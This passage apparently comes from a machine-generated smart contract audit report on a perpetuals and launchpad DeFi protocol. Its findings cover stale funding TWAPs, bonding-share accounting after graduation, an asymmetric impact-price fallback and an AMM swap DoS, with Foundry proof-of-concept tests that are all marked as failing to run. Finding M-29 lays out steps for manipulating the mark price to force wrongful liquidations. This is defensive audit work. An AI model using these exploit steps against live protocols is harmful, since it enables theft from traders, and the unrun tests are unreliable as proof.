This approach fully removes the permanent-lock condition, preserves the intended invariant (mapping reflects tokens reserved for users, including dust that can later be distributed), and gives governance a precise, per-pool mechanism to reclaim dust once no shares remain.





 **Derived From** : Funding and mark components use TWAP without staleness/age bounds

## [L-27]. Funding settlement uses potentially unboundedly stale mark and index TWAPs without heartbeat checks

### Finding Severity Justification: Funding settlement uses TWAPs derived from PriceHistoryLib without any freshness/heartbeat enforcement. If mark or index snapshots are not updated for long periods, settleFunding will compute TWAPs based on stale single-snapshot data, misaligning funding transfers between longs and shorts. Impact is limited to correctness/robustness (mispriced funding) and depends on keeper/admin liveness; it is not attacker-controlled nor does it directly cause asset theft. Thus this is a QA/Low severity issue.
## Derived From Pattern/Invariant
Funding and mark components use TWAP without staleness/age bounds

## Exploit Type
Oracle

## Location
MarketLib.settleFunding

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
FundingRateEngine.settleFunding is called via MarketLib.settleFunding and uses TWAPs of markPrice and indexPrice over the time since last funding:

```solidity
function settleFunding(Market storage self) internal {
    bytes32 asset = self.asset;
    FundingRateEngine storage fundingRateEngine = StorageLib.loadFundingRateEngine(asset);
    MarketMetadata storage metadata = StorageLib.loadMarketMetadata(asset);

    uint256 interval = fundingRateEngine.getTimeSinceLastFunding();

    (int256 funding, int256 cumulativeFunding) = fundingRateEngine.settleFunding({
        asset: asset,
        markTwap: metadata.markPriceHistory.twap(interval),
        indexTwap: metadata.indexPriceHistory.twap(interval)
    });
    ...
}
```

The underlying TWAP implementation in PriceHistoryLib:

```solidity
function twap(PriceHistory storage history, uint256 twapInterval) internal view returns (uint256) {
    uint256 idx = history.snapshots.length;
    if (idx == 0) return 0;

    PriceSnapshot memory currentSnapshot = history.snapshots[--idx];
    if (idx == 0) return currentSnapshot.price;

    uint256 targetTime = block.timestamp - twapInterval;
    ... // walk backwards until timestamp <= targetTime or history exhausted
    return weightedPrice / elapsedTime;
}
```

There is no **max-age** or **heartbeat** check on the last snapshot:

* If no new mark/index snapshots have been taken for a long time (e.g. keepers/offchain processes stop calling setMarkPrice), `markPriceHistory` and `indexPriceHistory` may both be hours or days old.
* Later, when someone eventually calls settleFunding, `interval = getTimeSinceLastFunding()` will be large, and `twap(interval)` will happily compute an average over potentially very old prices, or even return the last snapshot price if the history is short.

This means funding payments between longs and shorts can be computed on outdated price information, even though no attacker directly controls the indexPrice feed (which is considered trusted). While this primarily depends on keeper/role behavior, the absence of on-chain freshness checks means the protocol itself cannot detect or reject stale data.

Given that privileged roles are trusted, this is primarily a **robustness issue** rather than an attacker-controlled exploit, but it still breaks the expectation that funding reflects recent mark/index spreads.

## Impact
Without max-age/heartbeat enforcement on mark/index PriceHistory, settleFunding can compute funding over long intervals using a single very old snapshot. This causes funding transfers between longs and shorts to reflect stale spreads rather than current market conditions. While not an attacker-controlled theft vector, it degrades pricing correctness and can create material PnL drift across long gaps (keeper liveness or operational outages), potentially misallocating value over extended periods.

## Command to Run Test


## Proof of Concept
High-level steps:
1) Initialize a perps Market with Status.ACTIVE and a FundingRateSettings.fundingInterval (e.g., 1 hour).
2) Snapshot one mark/index price (both equal) into MarketMetadata.markPriceHistory and indexPriceHistory (e.g., 1000e18) and set FundingRateEngine.lastFundingTime = now.
3) Do not post any new snapshots for several hours (no calls to setMarkPrice). Warp the chain time forward by, say, 6 hours.
4) Call MarketLib.settleFunding. Since interval = getTimeSinceLastFunding() is large and both histories contain only one old snapshot, twap(interval) will return that single snapshot price for both mark and index.
5) FundingRateEngine.settleFunding computes premium = (markTwap - indexTwap) / indexTwap = 0 (equal stale prices), producing fundingIndex = 0 and leaving cumulativeFunding unchanged.
6) Result: funding settles over a multi-hour period using old/stale prices, instead of reverting or enforcing heartbeat age bounds.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Market, MarketLib} from "contracts/perps/types/Market.sol";
import {StorageLib} from "contracts/perps/types/StorageLib.sol";
import {FundingRateSettings} from "contracts/perps/types/FundingRateEngine.sol";
import {PriceHistory} from "contracts/perps/types/PriceHistory.sol";
import {Status} from "contracts/perps/types/Enums.sol";

contract StaleFundingSettlementTest is Test {
    bytes32 constant ASSET = keccak256("TEST-ASSET");
    Market internal market;

    function setUp() public {
        // Initialize market settings
        MarketSettings memory ms;
        ms.status = Status.ACTIVE;
        ms.crossMarginEnabled = true;
        ms.maxOpenLeverage = 10e18;
        ms.maintenanceMarginRatio = 0.05e18;
        ms.liquidationFeeRate = 0.005e18;
        ms.divergenceCap = 0.1e18;
        ms.reduceOnlyCap = 50;
        ms.partialLiquidationThreshold = 20_000e18;
        ms.partialLiquidationRate = 0.2e18;

        // Minimal funding settings: 1 hour interval, clamps/interest = 0
        FundingRateSettings memory fs;
        fs.fundingInterval = 1 hours;

        // Initialize the market (sets asset, markPrice, settings and lastFundingTime)
        MarketLib.init(market, ASSET, ms, fs, 1000e18);

        // Seed a single stale snapshot for both mark and index
        // Note: setMarkPrice() would also snapshot, but we want exactly one snapshot at t0
        StorageLib.loadMarketMetadata(ASSET).markPriceHistory.snapshot(1000e18);
        StorageLib.loadMarketMetadata(ASSET).indexPriceHistory.snapshot(1000e18);
    }

    function testSettleFundingUsesStaleSingleSnapshot() public {
        // Ensure funding interval has elapsed (warp 6 hours without new snapshots)
        vm.warp(block.timestamp + 6 hours);

        // Pre: cumulative funding should be zero
        int256 beforeCumulative = StorageLib.loadFundingRateEngine(ASSET).getCumulativeFunding();
        assertEq(beforeCumulative, 0);

        // Invoke funding settlement; due to single old snapshot for both mark & index,
        // twap(interval) will just return that stale price; premium = 0 => fundingIndex = 0
        MarketLib.settleFunding(market);

        // Post: funding remains unchanged (0) even though 6 hours elapsed,
        // because prices were stale and equal
        int256 afterCumulative = StorageLib.loadFundingRateEngine(ASSET).getCumulativeFunding();
        assertEq(afterCumulative, beforeCumulative);

        // Also show explicitly that the TWAP used over the long interval was just the old price
        uint256 markTwap = StorageLib.loadMarketMetadata(ASSET).markPriceHistory.twap(6 hours);
        uint256 indexTwap = StorageLib.loadMarketMetadata(ASSET).indexPriceHistory.twap(6 hours);
        assertEq(markTwap, 1000e18);
        assertEq(indexTwap, 1000e18);
    }
}


## Suggested Mitigation
Enforce freshness/heartbeat before using TWAPs for funding:
- Track and enforce a max allowed staleness for both mark and index histories. For example, store lastSnapshotTimestamp in PriceHistory and require block.timestamp - lastSnapshotTimestamp <= maxAge before computing TWAP. If violated, revert or skip settlement.
- Require a minimum number of snapshots covering the requested TWAP window (e.g., at least 2 snapshots spanning >= twapInterval). If history is too short or too old, revert.
- Consider adding heartbeat parameters (per asset) to FundingRateSettings, e.g., markMaxAge and indexMaxAge, and use them inside MarketLib.settleFunding to validate histories before calling twap().
- As a lesser alternative, return an error when twap() must fall back to a single snapshot value for long intervals; this makes the failure explicit and prevents silent mispricing.





 **Derived From** : StateMachine Invariant: Launchpad._graduate / buy / LaunchToken._beforeTokenTransfer

## [L-28]. Bonding-share accounting continues to mutate after token graduation, violating expected lifecycle

### Finding Severity Justification: Post-graduation transfers continue to reduce bonding shares and totalFeeShare, and call Distributor.decreaseStake. This violates the expected lifecycle (bonding-share state should be fixed after unlock) but does not directly cause asset loss by itself. The impact is primarily a state-machine/spec mismatch and accounting inconsistency, though it can contribute to a separate, more severe DoS condition if totalShares later reaches zero.
## Derived From Pattern/Invariant
StateMachine Invariant: Launchpad._graduate / buy / LaunchToken._beforeTokenTransfer

## Exploit Type
AccountingInvariantViolation

## Location
LaunchToken._beforeTokenTransfer

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The launchpad token lifecycle is intended to be:
1) Bonding phase: transfers restricted; fee-sharing/bonding shares accrue.
2) Graduation: bonding completes; token transfers are unlocked; bonding-share state becomes immutable so that pre-bonding shares define rewards.

Formal invariant:
> Once a token has graduated (`launches[token].active == false`), then:
> - `LaunchToken.unlocked == true` and
> - No further changes should occur to `LaunchToken.bondingShare[...]` or `totalFeeShare`, i.e., no further Distributor.stake/unstake calls.

Implementation breaks this invariant:

- Launchpad graduation logic:

```solidity
function _graduate(...) internal returns (...) {
    LaunchToken(buyData.token).unlock();
    _launches[buyData.token].active = false;
    ...
}
```

- `LaunchToken._beforeTokenTransfer`:

```solidity
function _beforeTokenTransfer(address from, address to, uint256 amount) internal override {
    if (!unlocked && from != launchpad && to != launchpad && to != gteRouter) {
        revert TransfersDisabledWhileBonding();
    }

    if (!unlocked) {
        ...
        if (from == launchpad && to != launchpad) _increaseFeeShares(to, amount);
        else if (to != launchpad && to != gteRouter) revert TransfersDisabledWhileBonding();
    }

    if (from != launchpad) _decreaseFeeShares(from, amount);
}
```

Key points:
- The second `if (!unlocked)` block fully governs `_increaseFeeShares` and bonding-share minting. After unlock, it no longer runs, so no new fee shares are created post-graduation.
- However, the final line `if (from != launchpad) _decreaseFeeShares(from, amount);` is executed **regardless of `unlocked`**.

As a result, after graduation (`unlocked == true`, `launches[token].active == false`):
- Any transfer where `from != launchpad` will still call `_decreaseFeeShares(from, amount)`.
- `_decreaseFeeShares` mutates both `totalFeeShare` and `bondingShare[from]` and calls back into `Launchpad.decreaseStake` → `Distributor.decreaseStake`:

```solidity
function _decreaseFeeShares(address account, uint256 amount) internal {
    uint256 share = bondingShare[account];
    if (share == 0 || account == address(0)) return;

    amount = amount > share ? share : amount;

    emit FeeShareDecreased(account, amount, _incEventNonce());

    unchecked {
        totalFeeShare -= amount;
        bondingShare[account] -= amount;
    }

    if (totalFeeShare == 0 && !unlocked) _endRewards();

    ILaunchpad(launchpad).decreaseStake(account, uint96(amount));
}
```

So even though bonding is logically over, any subsequent transfers keep *reducing* users' `bondingShare` and `totalFeeShare`, and trigger `Distributor.unstake` events. This contradicts the natural expectation that bonding-share state is frozen once the token is fully launched.

Effects:
- Time of graduation no longer snapshots fee-sharing state. Users who transfer out after graduation continue to alter `totalFeeShare` and Distributor shares.
- Accounting in Distributor effectively treats post-graduation transfers as reducing the pool of stakers, which may not be intended if rewards are meant to reflect bonding-era participation only.
- This behavior contributes to the more severe DoS bug in the other finding (eventual `totalShares == 0` while rewardsPoolActive remains 1), but is an independent state-machine violation: the contract continues to execute bonding-related side effects in a phase where bonding is finished.

While this bug on its own may not directly cause fund loss, it violates the documented lifecycle and can break off-chain assumptions and analytics.

## Impact
After graduation (unlocked == true), any transfer from a non-launchpad sender still calls _decreaseFeeShares, which mutates totalFeeShare and bondingShare and invokes Launchpad.decreaseStake → Distributor.unstake. This breaks the expected lifecycle snapshot at graduation and can force Distributor.totalShares down to zero post-grad. If totalShares reaches zero while the AMM pair’s rewardsPoolActive remains enabled, subsequent addRewards calls will revert (NoSharesToIncentivize), potentially reverting swaps that try to accrue/distribute fees via the Distributor. While not an immediate asset loss by itself, this creates accounting inconsistencies and can contribute to downstream DoS of AMM fee distribution and swaps.

## Command to Run Test


## Proof of Concept
Minimal attack/demo flow (no full Launchpad wiring required):
1) A mock Launchpad deploys LaunchToken (constructor sets launchpad = msg.sender), mints supply to itself, and transfers some tokens to user during bonding (unlocked == false). This increases bondingShare[user] and totalFeeShare via _increaseFeeShares as expected.
2) The mock Launchpad calls token.unlock() to simulate graduation (unlocked = true).
3) The user transfers tokens to another address after graduation.
4) Observe that totalFeeShare and bondingShare[user] both decrease, and the mock Launchpad records a decreaseStake call post-graduation. This shows bonding-share accounting continues to mutate after unlock, violating the intended snapshot semantics.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {LaunchToken} from "contracts/launchpad/LaunchToken.sol";

contract MockLaunchpad {
    uint256 public decreaseStakeCalls;

    // Hooks expected by LaunchToken during bonding/reductions
    function increaseStake(address /*account*/, uint96 /*shares*/) external {}
    function decreaseStake(address /*account*/, uint96 shares) external { decreaseStakeCalls += shares; }
    function endRewards() external {}

    // Helpers to drive LaunchToken lifecycle with launchpad-only functions
    function deployToken(string memory n, string memory s, string memory uri, address gteRouter)
        external
        returns (LaunchToken)
    {
        return new LaunchToken(n, s, uri, gteRouter);
    }
    function mint(LaunchToken t, uint256 amount) external { t.mint(amount); }
    function transferOut(LaunchToken t, address to, uint256 amount) external { t.transfer(to, amount); }
    function unlock(LaunchToken t) external { t.unlock(); }
}

contract LaunchTokenPostGradAccountingTest is Test {
    MockLaunchpad lp;
    LaunchToken token;
    address user = address(0xBEEF);
    address recipient = address(0xCAFE);

    function setUp() public {
        lp = new MockLaunchpad();
        // Deploy token with launchpad set to MockLaunchpad
        token = lp.deployToken("Token", "TKN", "", address(0x1234));

        // Mint supply to launchpad (onlyLaunchpad)
        vm.prank(address(lp));
        token.mint(1_000 ether);

        // Simulate bonding-era distribution: launchpad -> user
        vm.prank(address(lp));
        token.transfer(user, 600 ether);

        // Sanity: bonding shares accrued during bonding
        assertEq(token.unlocked(), false);
        assertGt(token.totalFeeShare(), 0);
        assertGt(token.bondingShare(user), 0);
    }

    function testSharesStillDecreaseAfterGraduation() public {
        uint256 oldTotal = token.totalFeeShare();
        uint256 oldUser = token.bondingShare(user);

        // Graduate (unlock transfers)
        vm.prank(address(lp));
        token.unlock();
        assertTrue(token.unlocked());

        // Post-graduation transfer from user
        vm.prank(user);
        token.transfer(recipient, 100 ether);

        // BUG: Shares decreased and decreaseStake invoked after unlock
        assertLt(token.totalFeeShare(), oldTotal);
        assertLt(token.bondingShare(user), oldUser);
        assertGt(lp.decreaseStakeCalls(), 0);
    }
}


## Suggested Mitigation
Freeze bonding-share accounting after graduation. Either guard the decrease call at the hook or early-return inside _decreaseFeeShares:

Option A (recommended, keeps logic localized at the hook):
- In LaunchToken._beforeTokenTransfer, change the final line to:
  if (!unlocked && from != launchpad) _decreaseFeeShares(from, amount);
  This ensures neither totalFeeShare/bondingShare nor Distributor stakes are mutated after unlock.

Option B (equivalent behavior, centralizes the guard in the function):
- In LaunchToken._decreaseFeeShares add at the top:
  if (unlocked) return;
  This prevents post-graduation mutations and downstream decreaseStake calls.

Additionally, review graduation flow to ensure the intended snapshot is explicit: if any rewards program state must be finalized at unlock, trigger it in Launchpad._graduate (e.g., snapshot or explicit end/suspend of further staking mutations), rather than relying on post-transfer side effects. This avoids drifting Distributor.totalShares post-grad and reduces risk of AMM rewards DoS when totalShares inadvertently reaches zero.





 **Derived From** : Asymmetric impact price fallback math can severely distort mark price and liquidations

## [M-29]. Asymmetric fallback in MarketLib.getImpactPrice lets thin books push mark price to extreme, wrong-liquidating users

### Finding Severity Justification: MarketLib.getImpactPrice uses asymmetric and dimensionally incorrect fallbacks when the book lacks depth: it adds an effectively zero base increment on the bid path (dividing by type(uint256).max) and an enormous increment on the ask path (dividing by 1). This deterministically produces extreme impact prices (near-zero or arbitrarily large), corrupting the impact-price component p3. While the mark price is the median of p1 (funding-rate component), p2 (index plus basis EMA), and p3 (impact price TWAP), the median will often clamp out an extreme p3. However, this breaks the intended design (impact component becomes useless or misleading) and can contribute to mispriced marks when combined with basis spread volatility in thin books. It also risks skewed funding over time. Given realistic paths to degraded pricing and potential liquidation edge cases in illiquid markets, this is a protocol correctness issue with potential economic impact.
## Derived From Pattern/Invariant
Asymmetric impact price fallback math can severely distort mark price and liquidations

## Exploit Type
PricePrecision

## Location
MarketLib.getImpactPrice

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: While the faulty math is indisputable, the worst-case liquidation impact depends on interaction with the median-of-three design and basis EMA behavior in thin books. In many cases the median will clamp out p3 extremes, limiting direct impact. Nonetheless, correctness is compromised and realistic adverse scenarios exist in illiquid markets.
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The perp mark price relies on an `impactPrice` computed from simulated trades against the CLOB via `MarketLib.getImpactPrice`. When there is insufficient depth to fill the configured `impactNotional`, the function uses two inconsistent fallback paths for bids vs asks:

```solidity
function getImpactPrice(Market storage self, uint256 impactNotional) internal view returns (uint256 impactPrice) {
    (uint256 baseAmount, uint256 quoteUsed) = StorageLib.loadBook(self.asset).quoteBidInQuote(impactNotional);

    if (impactNotional > quoteUsed)
        baseAmount += (impactNotional - quoteUsed).fullMulDiv(1e18, type(uint256).max);

    uint256 impactBid = baseAmount == 0 ? 0 : impactNotional.fullMulDiv(1e18, baseAmount);

    (baseAmount, uint256 quoteUsed) = StorageLib.loadBook(self.asset).quoteAskInQuote(impactNotional);

    if (impactNotional > quoteUsed)
        baseAmount += (impactNotional - quoteUsed).fullMulDiv(1e18, 1);

    uint256 impactAsk = impactNotional.fullMulDiv(1e18, baseAmount);

    return (impactBid + impactAsk) / 2;
}
```

On the **bid** side, any shortfall `impactNotional - quoteUsed` is converted to base via denominator `type(uint256).max`, so for realistic inputs the increment is effectively zero. `impactBid` is computed as `impactNotional * 1e18 / baseAmount`, where `baseAmount` only reflects actually-filled depth, so **when available bids are a tiny fraction of `impactNotional`, the resulting impact bid price explodes upwards**.

On the **ask** side, the same shortfall is converted with denominator `1`, i.e.:

```solidity
baseAmount += (impactNotional - quoteUsed) * 1e18;
```

This makes `baseAmount` astronomically large when there is little ask-side depth, so `impactAsk = impactNotional * 1e18 / baseAmount` becomes arbitrarily close to zero.

Then `impactPrice = (impactBid + impactAsk) / 2` is cached and used as one of three components in `setMarkPrice`:

```solidity
function setMarkPrice(Market storage self, uint256 indexPrice) internal returns (uint256 markPrice) {
    MarketMetadata storage metadata = StorageLib.loadMarketMetadata(self.asset);

    _cacheBasisSpread(self, indexPrice);
    _cacheImpactPrice(self);

    uint256 p1 = self.getFundingRateComponent(indexPrice);
    uint256 p2 = (indexPrice.toInt256() + self.getBasisSpreadEMA()).toUint256();
    uint256 p3 = self.getImpactPriceTwap();

    self.markPrice = markPrice = _getMedian(p1, p2, p3);
    ...
}

function _cacheImpactPrice(Market storage self) private returns (uint256 impactPrice) {
    uint256 impactNotional = uint256(500e18).fullMulDiv(
        StorageLib.loadMarketSettings(self.asset).maxOpenLeverage,
        1e18
    );

    impactPrice = self.getImpactPrice(impactNotional);
    StorageLib.loadMarketMetadata(self.asset).impactPriceHistory.snapshot(impactPrice);
}
```

Because the fallback uses **incompatible denominators** (`type(uint256).max` vs `1`) and ignores the dimensions of `impactNotional`/`quoteUsed`, the thin-book path is not just noisy but **systematically wrong**:

* In a shallow book, `impactBid` can be orders of magnitude above true executable price.
* Simultaneously, `impactAsk` can be arbitrarily close to zero.
* Their average, and then its TWAP (`impactPriceHistory.twap`), is far from any economically meaningful value.

An attacker can exploit this by:

1. Posting tiny stub orders on one or both sides so that `quoteBidInQuote` / `quoteAskInQuote` fill only a fraction of `impactNotional` (ensuring the `impactNotional > quoteUsed` branches are used).
2. Letting (or triggering) keepers call `setMarkPrice(indexPrice)`, which snapshots the distorted `impactPrice` into `impactPriceHistory`.
3. Repeating to make the **impact price TWAP** (`p3`) persistently extreme relative to index.
4. Since markPrice is the median of `[p1, p2, p3]`, skewing `p3` enough can move the median mark, especially in illiquid markets where basis EMA is also volatile.

Consequences:

* Healthy positions can become **incorrectly liquidatable** because `markPrice` is artificially high for shorts or low for longs, violating maintenance margin checks used in `ClearingHouseLib.isLiquidatable`.
* Conversely, underwater positions can be kept **artificially solvent** to extract more from insurance fund and other traders.
* Funding payments, which depend on mark versus index TWAPs, can be skewed over many intervals, enabling systematic funding arbitrage.

This issue is rooted in **incorrect price / unit math**, not generic oracle manipulation: the fallback path is dimensionally invalid and asymmetrical, creating deterministic, exploitable distortions whenever orderbook depth is less than the configured `impactNotional` (which is hard-coded as `500 * maxOpenLeverage`).

## Impact
Because MarketLib.getImpactPrice fabricates base amounts with incompatible denominators (type(uint256).max on the bid path vs 1 on the ask path), the impact price becomes pathologically large or nearly zero whenever the configured impactNotional cannot be fully filled from the orderbook. This breaks the economic meaning of the impact-price component (p3). While the final mark price is a median of p1 (funding component), p2 (index plus basis EMA), and p3 (impact-price TWAP), the distorted p3 can still influence the median whenever p2 is temporarily skewed (e.g., by manipulating best bid/ask to move the mid and hence the basis EMA). That can misprice mark, causing premature or suppressed liquidations and skewed funding over time. In thin books, this is a realistic correctness and economic-risk issue.

## Command to Run Test


## Proof of Concept
Setup and exploitation steps

1) Consider a newly listed market with indexPrice ≈ 1000e18. Configure a very thin orderbook.
2) Post a tiny ask at an absurdly low price (e.g., price=1) and a tiny bid near index (e.g., price=1000e18). This ensures quoteBidInQuote(impactNotional) consumes negligible quote on the ask side (quoteUsed ≈ 0, baseAmount small), and quoteAskInQuote(impactNotional) consumes little on the bid side (baseAmount small, quoteUsed ≪ impactNotional).
3) Call setMarkPrice(indexPrice). Internally:
   - getImpactPrice does:
     • Bid leg: baseAmount is tiny; fallback adds (impactNotional-quoteUsed)*1e18/type(uint256).max ≈ 0, so impactBid ≈ impactNotional*1e18 / smallBase → enormous.
     • Ask leg: baseAmount is tiny; fallback adds (impactNotional-quoteUsed)*1e18/1 → astronomically large, so impactAsk ≈ impactNotional*1e18 / hugeBase → ≈ 0.
   - Therefore impactPrice ≈ (huge + ~0)/2 → huge. This snapshot is pushed into impactPriceHistory and can dominate its TWAP if repeated.
4) Repeating this for several intervals produces an extreme p3. If the attacker also nudges mid (via best ask/bid stubs) to skew basis EMA (p2), the mark’s median of [p1, p2, p3] can be pulled away from fair value, enabling liquidations of solvent counterparties or preventing timely liquidations (bad debt risk) and distorting funding.

## Proof of Code
pragma solidity 0.8.27;
import "forge-std/Test.sol";
import {Market, MarketLib, MarketSettings} from "contracts/perps/types/Market.sol";
import {StorageLib} from "contracts/perps/types/StorageLib.sol";
import {Book, BookLib, BookSettings} from "contracts/perps/types/Book.sol";
import {Order, OrderIdLib, Side} from "contracts/perps/types/Order.sol";
import {FundingRateSettings} from "contracts/perps/types/FundingRateEngine.sol";
import {Status, BookType} from "contracts/perps/types/Enums.sol";

contract ImpactPricePathologyTest is Test {
    using MarketLib for Market;
    using BookLib for Book;

    bytes32 constant ASSET = keccak256("TEST");
    Market internal market;

    function setUp() public {
        // Minimal market settings
        MarketSettings memory ms;
        ms.status = Status.ACTIVE;
        ms.crossMarginEnabled = true;
        ms.maxOpenLeverage = 10e18; // 10x
        ms.maintenanceMarginRatio = 1e17; // 10%

        market.init(
            ASSET,
            ms,
            FundingRateSettings({
                fundingInterval: 1 hours,
                resetInterval: 1 hours,
                resetIterations: 1,
                innerClamp: 1e17,
                outerClamp: 1e17,
                interestRate: 0
            }),
            1000e18 // initial mark
        );

        // Minimal book config/settings
        Book storage book = StorageLib.loadBook(ASSET);
        book.config.asset = ASSET;
        book.config.bookType = BookType.STANDARD;
        book.config.lotSize = 1; // allow unit-sized orders

        BookSettings storage bs = StorageLib.loadBookSettings(ASSET);
        bs.tickSize = 1;
        bs.minLimitOrderAmountInBase = 1;
    }

    function test_getImpactPrice_explodes_on_thin_book() public {
        Book storage book = StorageLib.loadBook(ASSET);

        // Tiny ask at near-zero price → consumes negligible quote, small base
        Order memory ask;
        ask.owner = address(this);
        ask.side = Side.SELL;
        ask.id = OrderIdLib.wrap(1);
        ask.price = 1; // absurdly low price
        ask.amount = 1; // minimal base
        book.addOrderToBook(ask);

        // Tiny bid near index → small depth on the bid side
        Order memory bid;
        bid.owner = address(this);
        bid.side = Side.BUY;
        bid.id = OrderIdLib.wrap(2);
        bid.price = 1000e18; // near index
        bid.amount = 1;
        book.addOrderToBook(bid);

        // impactNotional = 500e18 * maxOpenLeverage / 1e18
        uint256 impactNotional = uint256(500e18) * StorageLib.loadMarketSettings(ASSET).maxOpenLeverage / 1e18;

        uint256 impact = market.getImpactPrice(impactNotional);
        // Due to asymmetric fallback, this becomes astronomically large
        assertGt(impact, 1e24, "impact price should be massively inflated");
    }
}


## Suggested Mitigation
Replace the asymmetric, dimensionally incorrect fallback with a symmetric and unit-consistent approach. Two robust options:

Option A (use only executable depth; skip on insufficiency)
- Remove the fabricated base increments entirely.
- Compute impactBid and impactAsk from actually filled amounts only:
  • If quoteUsed == 0 or baseAmount == 0 for a side, treat that side as unavailable (e.g., set impactSide = 0 and mark a flag).
  • If either side is unavailable, either:
    - skip snapshotting impactPrice for this block (no update to impactPriceHistory), or
    - use a trusted fallback like mid price or index price, clamped by divergenceCap.
- Example replacement logic:
  uint256 impactBid = (baseBid > 0) ? quoteBidUsed.fullMulDiv(1e18, baseBid) : 0;
  uint256 impactAsk = (baseAsk > 0) ? quoteAskUsed.fullMulDiv(1e18, baseAsk) : 0;
  if (impactBid == 0 || impactAsk == 0) { return 0; /* signal insufficient depth; caller can skip snapshot */ }
  return (impactBid + impactAsk) / 2;

Option B (symmetric conversion of shortfall using a reasonable price proxy)
- When impactNotional > quoteUsed, estimate the missing base with a symmetric and dimensionally correct conversion using a bounded price proxy (prefer midPrice; fallback to indexPrice), e.g.:
  missingBase = (impactNotional - quoteUsed).fullMulDiv(1e18, proxyPrice);
  baseAmount += missingBase;
- Apply the same logic on both bid and ask paths. If proxyPrice == 0 (no mid), fall back to indexPrice; if still 0, skip.

Additionally (recommended for either option)
- Clamp the final impactPrice before snapshot: if it deviates from indexPrice by more than divergenceCap, discard or clamp to the cap. This prevents outliers from polluting the impactPrice TWAP in illiquid conditions.

These changes restore dimensional correctness, symmetry, and ensure p3 remains economically meaningful instead of being deterministically skewed by thin books.





 **Derived From** : Untrusted Distributor callback can DoS AMM swaps when rewards shares go to zero

## [L-30]. GTELaunchpadV2Pair swaps can be DoS'ed when rewards pool has zero shares but rewardsPoolActive is still set

### Finding Severity Justification: Impact is pool-wide swap DoS (availability) when Distributor.addRewards reverts due to zero shares. However, reaching this state requires trusted Launchpad operations (onlyLaunchpad can create pools and adjust shares via increaseStake/decreaseStake, and only Launchpad can end rewards). This is a governance/misconfiguration risk rather than a permissionless exploit, so per C4 rules it is capped at Low.
## Derived From Pattern/Invariant
Untrusted Distributor callback can DoS AMM swaps when rewards shares go to zero

## Exploit Type
Dos

## Location
GTELaunchpadV2Pair.swap / _update / _distributeLaunchpadFees

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The Uniswap V2–style pair `GTELaunchpadV2Pair` integrates with the Distributor by forwarding part of swap fees as launchpad rewards via a synchronous callback in its core `_update` function. This external call is not isolated (no try/catch), so any revert in Distributor.addRewards bubbles up and reverts the entire swap/mint/burn/sync that triggered it.

Relevant sections:

```solidity
function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external lock {
    ...
    (uint112 _reserve0, uint112 _reserve1,) = getReserves();
    ...
    uint256 amount0In = ...;
    uint256 amount1In = ...;
    ...
    {
        uint256 balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));
        uint256 balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));
        ...
        (uint112 launchpadFee0, uint112 launchpadFee1) =
            launchpadFeeDistributor > address(0) && rewardsPoolActive > 0
                ? _getLaunchpadFees(amount0In, amount1In)
                : (uint112(0), uint112(0));

        _update(balance0, balance1, _reserve0, _reserve1, launchpadFee0, launchpadFee1);
    }
    ...
}

function _update(
    uint256 balance0,
    uint256 balance1,
    uint112 _reserve0,
    uint112 _reserve1,
    uint112 newLaunchpadFee0,
    uint112 newLaunchpadFee1
) private {
    ...
    uint112 totalLaunchpadFee0 = accruedLaunchpadFee0 + newLaunchpadFee0;
    uint112 totalLaunchpadFee1 = accruedLaunchpadFee1 + newLaunchpadFee1;
    ...
    if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {
        ...
        if (launchpadFeeDistributor > address(0)) {
            if (totalLaunchpadFee0 | totalLaunchpadFee1 > 0) {
                delete accruedLaunchpadFee0;
                delete accruedLaunchpadFee1;
                _distributeLaunchpadFees(totalLaunchpadFee0, totalLaunchpadFee1);
            }
        }
    } else if (launchpadFeeDistributor > address(0) && newLaunchpadFee0 | newLaunchpadFee1 > 0) {
        accruedLaunchpadFee0 = totalLaunchpadFee0;
        accruedLaunchpadFee1 = totalLaunchpadFee1;
        emit LaunchpadFeesAccrued(newLaunchpadFee0, newLaunchpadFee1);
    }
    ...
}

function _distributeLaunchpadFees(uint112 fee0, uint112 fee1) internal {
    if ((fee0 | fee1) > 0) {
        address _token0 = token0;
        address _token1 = token1;
        address distributor = launchpadFeeDistributor;

        if (fee0 > 0) _safeApprove(_token0, distributor, uint256(fee0));
        if (fee1 > 0) _safeApprove(_token1, distributor, uint256(fee1));

        IDistributor(distributor).addRewards(_token0, _token1, uint128(fee0), uint128(fee1));

        emit LaunchpadFeesCollected(fee0, fee1);
    }
}
```

Distributor.addRewards enforces that the reward pool has non-zero shares:

```solidity
function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
    ...
    if (rs.totalShares == 0) revert NoSharesToIncentivize();
    ...
}
```

System-level behaviour:
* During the bonding/staking phase, the Launchpad calls Distributor.increaseStake / decreaseStake to manage staker shares for the associated launch asset; these flows can eventually reduce `rs.totalShares` to 0 when all stakers exit.
* The pair’s `rewardsPoolActive` flag is only turned off when `IDistributor.endRewards` → `GTELaunchpadV2Pair.endRewardsAccrual()` is called:

```solidity
function endRewardsAccrual() external {
    if (msg.sender != launchpadFeeDistributor) revert("GTEUniV2: FORBIDDEN");
    delete accruedLaunchpadFee0;
    delete accruedLaunchpadFee1;
    delete rewardsPoolActive;
    _update(..., 0, 0);
    emit RewardsPoolDeactivated();
}
```

If all users unstake so that `rs.totalShares == 0` but `rewardsPoolActive` is still `1` and `launchpadFeeDistributor` is set, then any swap (or mint/burn/sync that triggers `_distributeLaunchpadFees`) with nonzero launchpad fees will:
1. Compute `launchpadFee0/1 > 0` in `_getLaunchpadFees`.
